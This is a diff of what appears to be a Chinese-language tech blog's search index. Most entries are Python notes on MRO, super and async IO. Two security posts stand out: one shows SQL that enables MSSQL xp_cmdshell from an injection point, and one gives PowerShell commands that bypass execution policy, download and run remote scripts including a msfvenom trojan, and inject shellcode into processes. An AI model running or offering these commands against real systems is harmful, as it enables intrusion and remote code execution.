-<li><p>二义性问题：派生类与基类中存在名字相同的数据或函数，使得无法判断与调用。例如，有两个基类A和B，A和B都定义了方法f()，C继承A和B，那么调用C的f()方法时会出现不确定。</p>
-</li>
-<li><p>MRO：method resolution order（方法解释顺序），主要用于在多继承时判断属性(成员变量/方法)的搜索顺序，解决二义性问题。通过拓扑排序实现。可通过内置<code>__mro__</code>或者<code>mro()</code>查看类的mro列表。</p>
-</li>
-<li><p>拓扑排序：对一个有向无环图G进行拓扑排序，是将G中所有顶点排成一个线性序列，使得图中任意一对顶点u和v，若边(u,v)∈E(G)，则u在线性序列中出现在v之前。<code>实现步骤：选择一个入度为0的顶点并输出；从图中删除此顶点及所有出边。</code></p>
-<a id="more"></a>
-<p><a href="https://imgchr.com/i/kgh49U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/19/kgh49U.md.jpg" alt="kgh49U.md.jpg"></a></p>
-</li>
-</ul>
-<p>此为一个多重继承关系图，首先选入度为0的元素A,再删除从A出去的边，此时B，C都是入度为0，从左到右选择，所以选择B并删除B的边,再接着就是E,C,D,F,最后是object,所以A的MRO列表为<code>[A,B,E,C,D,F,object]</code></p>
-<h3 id="0x2-super的两种调用方式"><a href="#0x2-super的两种调用方式" class="headerlink" title="0x2 super的两种调用方式"></a>0x2 super的两种调用方式</h3><blockquote>
-<p>提供一个MRO以及一个MRO中的类C, super()将返回一个从MRO中C之后的类中查找方法的对象。</p>
-</blockquote>
-<ul>
-<li><code>super(a_type, obj).func()</code>,此时func是与obj绑定的,MRO 指的是 type(obj) 的 MRO, MRO 中的那个类就是 a_type , 同时 isinstance(obj, a_type) == True 。</li>
-<li><code>super(type1, type2).func()</code>,此时func未绑定,MRO 指的是 type2 的 MRO, MRO 中的那个类就是 type1 ，同时 issubclass(type2, type1) == True 。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title> Mssql开启xp_cmdshell		</title>
-    <url>/2018/07/29/mssql-e5-bc-80-e5-90-afxp-cmdshell/</url>
-    <content><![CDATA[<h5 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1; //显示或修改高级选项
-RECONFIGURE;
-EXEC sp_configure &apos;xp_cmdshell&apos;,0;
-RECONFIGURE;
-</code></pre><a id="more"></a>
-<h5 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1;
-RECONFIGURE;
-EXEC sp_configure &apos;xp_cmdshell&apos;, 1;
-RECONFIGURE;
-</code></pre><p>在注入点运行上述语句时,如果出现这样的回显,<code>标记message: 配置选项 &#39;xp_cmdshell&#39; 不存在</code>,可执行以下语句</p>
-<pre><code>EXEC sp_configure &apos;show advanced options&apos;,1;
-RECONFIGURE;
-EXEC sp_configure &apos;user connections&apos;,1;
-RECONFIGURE;
-</code></pre>]]></content>
-      <categories>
-        <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
@@ -570,6 +453,123 @@ produce(c)
 <p><pre><code><br>[PRODUCER] Producing 1…<br>[CONSUMER] Consuming 1…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 2…<br>[CONSUMER] Consuming 2…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 3…<br>[CONSUMER] Consuming 3…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 4…<br>[CONSUMER] Consuming 4…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 5…<br>[CONSUMER] Consuming 5…<br>[PRODUCER] Consumer return: 200 OK</code></pre></p>
 <p><pre><code></code></pre></p>
 ]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> Nishang/PowerSploit		</title>
+    <url>/2018/08/05/nishang-powersploit/</url>
+    <content><![CDATA[<blockquote>
+<p>nishang/powersploit都是针对powershell的渗透工具，提供了丰富powershell脚本，在后渗透的时候，不需要在靶机上上传任何工具，只要一个powershell，就可以远程下载执行脚本</p>
+</blockquote>
+<h3 id="1-Powershell"><a href="#1-Powershell" class="headerlink" title="1.Powershell"></a>1.Powershell</h3><p>查看执行策略</p>
+<pre><code>Get-ExecutionPolicy
+
+Restricted  //这是默认的设置。不能执行PowerShell脚本
+AllSigned   //只有数字签名的脚本将会运行，此外，会提示你允许运行那些使用指定的证书签名的脚本
+RemoteSigned    //经本地编写的脚本将会运行，从网络下载的脚本运行，除非他们签名了并且你批准了的签名的证书
+UnRestricted    //所有的脚本都将运行
+</code></pre><a id="more"></a>
+<p>设置执行策略，需要管理员权限</p>
+<pre><code>set-ExecutionPolicy
+</code></pre><p>绕过执行策略执行脚本</p>
+<pre><code>PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1
+
+//远程下载执行
+IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)
+在cmd模式下:
+powershell IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)
+powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)&quot;
+</code></pre><h3 id="2-Nishang"><a href="#2-Nishang" class="headerlink" title="2.Nishang"></a>2.Nishang</h3><p>导入所有模块nishang</p>
+<pre><code>import-module ./nishang.psm1
+
+get-command -module nishang     //查看命令
+</code></pre><p>单独导入Invoke-PortScan脚本</p>
+<pre><code>IEX (New-Object Net.WebClient).DownloadString(“http://localhost/webTools/nishang/Scan/Invoke-PortScan.ps1”)
+
+get-help Invoke-PortScan //查看使用方法
+</code></pre><p>nishang提供了丰富的脚本 <img src="https://s1.ax1x.com/2018/08/05/PDo9gA.png" alt="PDo9gA.png"></p>
+<h3 id="3-PowerSploit"><a href="#3-PowerSploit" class="headerlink" title="3.PowerSploit"></a>3.PowerSploit</h3><blockquote>
+<p>用法和nishang一样，有些重叠脚本</p>
+</blockquote>
+<p>Invoke-Shellcode:将shellcode插入您选择的进程ID或本地PowerShell中</p>
+<pre><code>IEX (New-Object Net.WebClient).DownloadString(“http://Invoke-Shellcode.ps1”) //导入Invoke-Shellcode脚本
+IEX (New-Object Net.WebClient).DownloadString(“http://msf.ps1”) //导入msfvenom生成的木马
+Invoke-Shellcode -Shellcode ($buf) //直接运行
+Invoke-Shellcode -ProcessID id -Shellcode($buf) -Force //进程注入运行
+</code></pre>]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> Python3 MRO与super		</title>
+    <url>/2019/02/19/python-mro-e4-b8-8esuper/</url>
+    <content><![CDATA[<h3 id="0x1-MRO"><a href="#0x1-MRO" class="headerlink" title="0x1 MRO"></a>0x1 MRO</h3><ul>
+<li><p>二义性问题：派生类与基类中存在名字相同的数据或函数，使得无法判断与调用。例如，有两个基类A和B，A和B都定义了方法f()，C继承A和B，那么调用C的f()方法时会出现不确定。</p>
+</li>
+<li><p>MRO：method resolution order（方法解释顺序），主要用于在多继承时判断属性(成员变量/方法)的搜索顺序，解决二义性问题。通过拓扑排序实现。可通过内置<code>__mro__</code>或者<code>mro()</code>查看类的mro列表。</p>
+</li>
+<li><p>拓扑排序：对一个有向无环图G进行拓扑排序，是将G中所有顶点排成一个线性序列，使得图中任意一对顶点u和v，若边(u,v)∈E(G)，则u在线性序列中出现在v之前。<code>实现步骤：选择一个入度为0的顶点并输出；从图中删除此顶点及所有出边。</code></p>
+<a id="more"></a>
+<p><a href="https://imgchr.com/i/kgh49U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/19/kgh49U.md.jpg" alt="kgh49U.md.jpg"></a></p>
+</li>
+</ul>
+<p>此为一个多重继承关系图，首先选入度为0的元素A,再删除从A出去的边，此时B，C都是入度为0，从左到右选择，所以选择B并删除B的边,再接着就是E,C,D,F,最后是object,所以A的MRO列表为<code>[A,B,E,C,D,F,object]</code></p>
+<h3 id="0x2-super的两种调用方式"><a href="#0x2-super的两种调用方式" class="headerlink" title="0x2 super的两种调用方式"></a>0x2 super的两种调用方式</h3><blockquote>
+<p>提供一个MRO以及一个MRO中的类C, super()将返回一个从MRO中C之后的类中查找方法的对象。</p>
+</blockquote>
+<ul>
+<li><code>super(a_type, obj).func()</code>,此时func是与obj绑定的,MRO 指的是 type(obj) 的 MRO, MRO 中的那个类就是 a_type , 同时 isinstance(obj, a_type) == True 。</li>
+<li><code>super(type1, type2).func()</code>,此时func未绑定,MRO 指的是 type2 的 MRO, MRO 中的那个类就是 type1 ，同时 issubclass(type2, type1) == True 。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> Python异步IO		</title>
+    <url>/2018/09/09/python-e5-bc-82-e6-ad-a5io/</url>
+    <content><![CDATA[<blockquote>
+<p>asyncio是Python 3.4版本引入的标准库，直接内置了对异步IO的支持。 asyncio的编程模型就是一个消息循环。我们从asyncio模块中直接获取一个EventLoop的引用，然后把需要执行的协程扔到EventLoop中执行，就实现了异步IO。</p>
+</blockquote>
+<h3 id="1-asyncio-coroutine-yield-from"><a href="#1-asyncio-coroutine-yield-from" class="headerlink" title="1.@ asyncio.coroutine/yield from"></a>1.@ asyncio.coroutine/yield from</h3><ul>
+<li><font color="#ff2a2a">@asyncio.coroutine</font>把一个函数标记为协程</li>
+<li><code>yield from</code>针对耗时的操作进行挂起，函数让出控制权<a id="more"></a>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now = <span class="keyword">lambda</span> : time.time()</span><br><span class="line"></span><br><span class="line"><span class="meta">@asyncio.coroutine</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_some_work</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125; start"</span>.format(x))</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">"&#123;&#125; end"</span>.format(x))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = now()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">tasks = [asyncio.ensure_future(do_some_work(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">print(<span class="string">"Time:"</span>,now()-start)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="2-async-await"><a href="#2-async-await" class="headerlink" title="2.async/await"></a>2.async/await</h3><ul>
+<li><code>async</code>代替<font color="#ff2a2a">@asyncio.coroutine</font></li>
+<li><code>await</code>代替<code>yield from</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now = <span class="keyword">lambda</span> : time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">do_some_work</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125; start"</span>.format(x))</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">"&#123;&#125; end"</span>.format(x))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = now()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">tasks = [asyncio.ensure_future(do_some_work(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">print(<span class="string">"Time:"</span>,now()-start)</span><br></pre></td></tr></table></figure>
+<h3 id="3-aiohttp"><a href="#3-aiohttp" class="headerlink" title="3.aiohttp"></a>3.aiohttp</h3><pre><code>import asyncio
+import aiohttp
+
+
+async def task(url):
+    print(&apos;start {}&apos;.format(url))
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url) as resp:
+            content=await resp.text()
+            print(&apos;{1} bytes from {0}&apos;.format(url,len(content)))
+
+urls=[&apos;https://github.com/&apos;,&apos;https://www.baidu.com/&apos;,&apos;https://www.python.org/&apos;]
+
+event_loop=asyncio.get_event_loop()
+
+tasks=[asyncio.ensure_future(task(i)) for i in urls]
+
+event_loop.run_until_complete(asyncio.wait(tasks))
+</code></pre><h3 id="4-gevent"><a href="#4-gevent" class="headerlink" title="4.gevent"></a>4.gevent</h3><ul>
+<li>python通过yield提供了对协程的基本支持，但是不完全。而第三方的gevent为Python提供了比较完善的协程支持。</li>
+<li>monkey.patch_all()将python的一些标准库(thread/socket等)改成非阻塞</li>
+<li>遇到io阻塞自动挂起，执行其他任务</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'GET: %s'</span> % url)</span><br><span class="line">    resp = request.urlopen(url)</span><br><span class="line">    data = resp.read()</span><br><span class="line">    print(<span class="string">'%d bytes received from %s.'</span> % (len(data), url))</span><br><span class="line"></span><br><span class="line">gevent.joinall([</span><br><span class="line">        gevent.spawn(f, <span class="string">'https://github.com/'</span>),</span><br><span class="line">        gevent.spawn(f, <span class="string">'https://www.baidu.com/'</span>),</span><br><span class="line">        gevent.spawn(f, <span class="string">' https://www.python.org/'</span>),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>WEB前端/后端</category>
       </categories>
